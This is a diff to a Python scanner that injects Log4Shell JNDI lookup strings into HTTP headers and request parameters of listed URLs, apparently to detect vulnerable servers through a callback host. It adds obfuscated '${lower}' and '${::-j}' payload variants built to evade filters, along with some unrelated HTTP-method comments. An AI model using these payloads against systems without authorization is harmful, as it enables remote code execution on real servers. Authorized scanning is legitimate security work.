@@ -40,6 +40,8 @@ prefixes_injects = [
     'jndi:${lower:l}${lower:d}ap',
     'jndi:rmi',
     'jndi:dns',
+    '${::-j}ndi:ldap',
+    '${${:-l}${:-o}${:-w}${:-e}${:-r}:J}${${:-l}${:-o}${:-w}${:-e}${:-r}:N}${${:-l}${:-o}${:-w}${:-e}${:-r}:D}${${:-l}${:-o}${:-w}${:-e}${:-r}:I}:${${:-l}${:-o}${:-w}${:-e}${:-r}:L}${${:-l}${:-o}${:-w}${:-e}${:-r}:D}${${:-l}${:-o}${:-w}${:-e}${:-r}:A}${${:-l}${:-o}${:-w}${:-e}${:-r}:P}'
 ]
 
 def get_payload(identifier, parameter, hostname, prefix_option: int):
@@ -47,7 +49,7 @@ def get_payload(identifier, parameter, hostname, prefix_option: int):
 
 def perform_request(method: str, identifier: str, url: str, url_id: str, parameters: list, hostname: str, timeout: int, prefix_option: int):
     try:
-        logging.info(f"{identifier} : {url_id} : {url} - {method}")
+        logging.info(f"[Request] {identifier} : {url_id} : {url} - {method}")
         # Injects POST body parameters
         headers = {}
         for header in header_injects:
@@ -57,7 +59,7 @@ def perform_request(method: str, identifier: str, url: str, url_id: str, paramet
             # Generate POST body without url-encode (probably can be prettier)
             data = "{"
             for parameter in parameters:
-                data += f"{parameter}={get_payload(identifier, parameter, hostname, prefix_option)}&"
+                data += f"{parameter}={get_payload(identifier, parameter, hostname, prefix_option)},"
             data = data[:-1]
             data += "}"
 
@@ -68,7 +70,34 @@ def perform_request(method: str, identifier: str, url: str, url_id: str, paramet
                 data=data,
                 verify=False
             )
-        
+
+            # GET
+            # The GET method requests a representation of the specified resource. Requests using GET should only retrieve data.
+
+            # HEAD
+            # The HEAD method asks for a response identical to a GET request, but without the response body.
+
+            # POST
+            # The POST method submits an entity to the specified resource, often causing a change in state or side effects on the server.
+
+            # PUT
+            # The PUT method replaces all current representations of the target resource with the request payload.
+
+            # DELETE
+            # The DELETE method deletes the specified resource.
+
+            # CONNECT
+            # The CONNECT method establishes a tunnel to the server identified by the target resource.
+
+            # OPTIONS
+            # The OPTIONS method describes the communication options for the target resource.
+
+            # TRACE
+            # The TRACE method performs a message loop-back test along the path to the target resource.
+
+            # PATCH
+            # The PATCH method applies partial modifications to a resource.
+
         # Injects GET parameters
         elif method == "GET":
             data = {}
@@ -93,7 +122,7 @@ def perform_request(method: str, identifier: str, url: str, url_id: str, paramet
                 verify=False
             )
 
-        logging.info(f"Status code: {r.status_code}")
+        logging.info(f"[Response] {identifier} : {url_id} : {url} - {method} - {r.status_code}")
 
     except requests.exceptions.ConnectionError as e:
         logging.warning(f"{identifier} : {url_id} : {url} - {e}")
@@ -102,10 +131,10 @@ def scan(row_queue: Queue, done_queue: Queue, hostname: str, wait: int, timeout:
     while not row_queue.empty():
         row = row_queue.get()
         if row in done_queue.queue:
-            logging.info(f"Already done: {row[0]} : {row[1]} - {row[2]}")
+            logging.info(f"Already done: {row[0]} : {row[1]} - {row[2]} + {prefix_option}")
             row_queue.task_done()
             continue
-        done_queue.put(row)
+        done_queue.put(row + [prefix_option])
         try:
             url_id = row[0]
             url = row[1]
